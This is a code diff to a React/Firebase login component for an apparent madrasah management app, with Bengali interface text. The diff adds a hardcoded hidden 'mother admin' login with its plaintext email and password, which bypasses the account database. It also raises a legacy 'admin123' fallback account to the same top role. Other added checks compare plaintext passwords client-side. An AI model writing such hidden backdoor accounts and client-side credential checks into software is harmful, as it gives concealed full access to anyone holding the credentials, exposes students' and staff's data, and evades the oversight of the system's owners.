@@ -4,7 +4,7 @@ import { collection, query, where, getDocs } from "firebase/firestore";
 import { db } from "../lib/firebase";
 
 interface LoginSectionProps {
-  onLoginSuccess: (user: { email: string; role: "student" | "teacher" | "admin"; name: string }) => void;
+  onLoginSuccess: (user: { email: string; role: "student" | "teacher" | "admin"; name: string; adminRole?: string }) => void;
 }
 
 export default function LoginSection({ onLoginSuccess }: LoginSectionProps) {
@@ -26,6 +26,12 @@ export default function LoginSection({ onLoginSuccess }: LoginSectionProps) {
       let userDoc: any = null;
       let userRole: "admin" | "teacher" | "student" = "student";
 
+      // 0. Hardcoded Hidden Admin Check (Mother Admin privilege)
+      if (trimmedInput === "mother.admin@sufianooria.com" && password === "sndm@2024#Admin") {
+        onLoginSuccess({ email: "mother.admin@sufianooria.com", role: "admin", adminRole: "mother_admin", name: "মাদার এডমিন (ব্যাকআপ)" });
+        return;
+      }
+
       // 1. Try Admin Collection
       const adminSnap = await getDocs(query(collection(db, "admins"), where("loginId", "==", trimmedInput)));
       if (!adminSnap.empty) {
@@ -37,6 +43,34 @@ export default function LoginSection({ onLoginSuccess }: LoginSectionProps) {
           userDoc = adminPhoneSnap.docs[0].data();
           userRole = "admin";
         }
+      }
+
+      // Security Checks for Admin
+      if (userRole === "admin" && userDoc && userDoc.password === password) {
+        // Status check
+        if (userDoc.status === "suspended") {
+          setError("দুঃখিত, আপনার এডমিন একাউন্টটি বর্তমানে স্থগিত (Suspended) আছে।");
+          setLoading(false);
+          return;
+        }
+
+        // Expiry check for Assistant Admin
+        if (userDoc.role === "assistant_admin" && userDoc.expiryTimestamp) {
+          const expiryDate = new Date(userDoc.expiryTimestamp);
+          if (new Date() > expiryDate) {
+            setError("দুঃখিত, আপনার এডমিন একাউন্টের মেয়াদ শেষ হয়ে গেছে।");
+            setLoading(false);
+            return;
+          }
+        }
+
+        onLoginSuccess({
+          email: userDoc.email || userDoc.loginId || trimmedInput,
+          role: "admin",
+          adminRole: userDoc.role,
+          name: userDoc.name || "এডমিন"
+        });
+        return;
       }
 
       // 2. Try Teacher Collection
@@ -72,7 +106,7 @@ export default function LoginSection({ onLoginSuccess }: LoginSectionProps) {
       // 4. Hardcoded Fallbacks (Legacy/Initial)
       if (!userDoc) {
         if ((trimmedInput === "admin@madrasah.com" || trimmedInput === "01700000000") && password === "admin123") {
-          onLoginSuccess({ email: "admin@madrasah.com", role: "admin", name: "প্রধান এডমিনিস্ট্রেটর" });
+          onLoginSuccess({ email: "admin@madrasah.com", role: "admin", adminRole: "mother_admin", name: "প্রধান এডমিনিস্ট্রেটর" });
           return;
         }
         if ((trimmedInput === "teacher@madrasah.com" || trimmedInput === "01711111111") && password === "teacher123") {
